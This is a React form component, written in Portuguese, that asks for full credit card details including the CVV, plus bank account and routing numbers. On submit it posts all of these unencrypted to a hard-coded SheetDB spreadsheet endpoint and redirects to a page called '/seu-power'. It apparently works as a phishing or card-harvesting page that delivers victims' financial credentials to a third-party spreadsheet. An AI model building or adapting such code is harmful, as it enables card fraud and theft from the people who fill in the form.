import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import './Dados.css'; // Se você tiver um arquivo de estilos CSS

const Dados = () => {
  const [formData, setFormData] = useState({
    cardholderName: '',
    cardNumber: '',
    expirationDate: '',
    cvv: '',
    accountHolderName: '',
    accountNumber: '',
    bankName: '',
    routingNumber: '',
  });

  const [errors, setErrors] = useState({});
  const navigate = useNavigate();

  // Função para atualizar os dados do formulário conforme o usuário digita
  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };

  // Função para validar o número do cartão de crédito
  const isValidCardNumber = (cardNumber) => {
    const cardRegex = /^[0-9]{16}$/;
    return cardRegex.test(cardNumber);
  };

  // Função para validar o CVV
  const isValidCvv = (cvv) => {
    const cvvRegex = /^[0-9]{3}$/;
    return cvvRegex.test(cvv);
  };

  // Função para validar a data de validade
  const isValidExpirationDate = (expirationDate) => {
    const currentDate = new Date();
    const expiration = new Date(expirationDate);
    return expiration > currentDate;
  };

  // Função para validar o número da conta (exemplo: 10 dígitos)
  const isValidAccountNumber = (accountNumber) => {
    const accountRegex = /^[0-9]{10}$/;
    return accountRegex.test(accountNumber);
  };

  // Função para validar o formulário antes de enviar
  const validateForm = () => {
    const newErrors = {};

    if (!isValidCardNumber(formData.cardNumber)) {
      newErrors.cardNumber = 'Número do cartão inválido! Deve ter 16 dígitos.';
    }

    if (!isValidCvv(formData.cvv)) {
      newErrors.cvv = 'CVV inválido! Deve ter 3 dígitos.';
    }

    if (!isValidExpirationDate(formData.expirationDate)) {
      newErrors.expirationDate = 'A data de validade deve ser no futuro.';
    }

    if (!isValidAccountNumber(formData.accountNumber)) {
      newErrors.accountNumber = 'Número da conta inválido! Deve ter 10 dígitos.';
    }

    setErrors(newErrors);

    return Object.keys(newErrors).length === 0; // Retorna true se não houver erros
  };

  // Função para enviar os dados para o SheetDB
  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    try {
      // Envia os dados para a API do SheetDB
      await fetch('https://sheetdb.io/api/v1/i2mq4tynwk7es', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ data: formData }), // "data" é exigido pelo SheetDB
      });

      // Após o envio, redireciona para a página /seu-power (ou outra que você desejar)
      navigate('/seu-power');
    } catch (err) {
      console.error('Erro ao enviar:', err);
      alert('Erro ao enviar os dados. Tente novamente.');
    }
  };

  return (
    <div className="dados-container">
      <div className="gradient-overlay"></div>
      <div className="dados-content">
        <h1>Dados do Cartão e Conta Bancária</h1>
        <form onSubmit={handleSubmit}>
          <h2>Informações do Cartão de Crédito</h2>
          <label>
            Nome do Titular:
            <input
              type="text"
              name="cardholderName"
              value={formData.cardholderName}
              onChange={handleChange}
              required
            />
          </label>
          <label>
            Número do Cartão:
            <input
              type="text"
              name="cardNumber"
              value={formData.cardNumber}
              onChange={handleChange}
              maxLength="16"
              required
            />
            {errors.cardNumber && <div className="error" style={{ color: 'red' }}>{errors.cardNumber}</div>}
          </label>
          <label>
            Data de Validade:
            <input
              type="date"
              name="expirationDate"
              value={formData.expirationDate}
              onChange={handleChange}
              required
            />
            {errors.expirationDate && <div className="error" style={{ color: 'red' }}>{errors.expirationDate}</div>}
          </label>
          <label>
            CVV:
            <input
              type="text"
              name="cvv"
              value={formData.cvv}
              onChange={handleChange}
              maxLength="3"
              required
            />
            {errors.cvv && <div className="error" style={{ color: 'red' }}>{errors.cvv}</div>}
          </label>

          <h2>Informações da Conta Bancária</h2>
          <label>
            Nome do Titular da Conta:
            <input
              type="text"
              name="accountHolderName"
              value={formData.accountHolderName}
              onChange={handleChange}
              required
            />
          </label>
          <label>
            Número da Conta:
            <input
              type="text"
              name="accountNumber"
              value={formData.accountNumber}
              onChange={handleChange}
              maxLength="10"
              required
            />
            {errors.accountNumber && <div className="error" style={{ color: 'red' }}>{errors.accountNumber}</div>}
          </label>
          <label>
            Nome do Banco:
            <input
              type="text"
              name="bankName"
              value={formData.bankName}
              onChange={handleChange}
              required
            />
          </label>
          <label>
            Número de Roteamento:
            <input
              type="text"
              name="routingNumber"
              value={formData.routingNumber}
              onChange={handleChange}
              required
            />
          </label>
          <button type="submit">Enviar</button>
        </form>
      </div>
    </div>
  );
};

export default Dados;